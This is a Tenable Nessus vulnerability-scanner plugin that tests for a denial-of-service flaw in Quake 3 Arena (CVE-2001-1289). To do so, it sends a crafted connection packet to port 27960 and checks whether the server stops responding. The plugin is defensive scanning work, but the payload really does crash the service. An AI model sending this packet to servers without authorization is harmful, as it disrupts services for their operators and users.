#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#


include("compat.inc");

if(description)
{
 script_id(10931);
 script_version("$Revision: 1.13 $");
 script_cve_id("CVE-2001-1289");
 script_bugtraq_id(3123);
 script_xref(name:"OSVDB", value:"9849");

 script_name(english:"Quake 3 Arena Malformed Connection Packet DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the Quake3 Arena daemon by sending a specially
crafted login string.

A cracker may use this attack to make this service crash continuously, 
preventing you from playing." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english: "Quake3 Arena DOS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english: "Windows");
 script_require_ports(27960);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
include("global_settings.inc");

function test_q3_port(port)
{
 local_var s, soc;
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 s = string(raw_string(0xFF, 0xFF, 0xFF, 0xFF), "connectxx");
 send(socket:soc, data:s);
 close(soc);

 soc = open_sock_tcp(port);
 if (! soc)
 {
  security_warning(port);
 }

 if (soc)
  close(soc);
 return(1);
}

if (report_paranoia < 2) exit(0);

test_q3_port(port:27960);
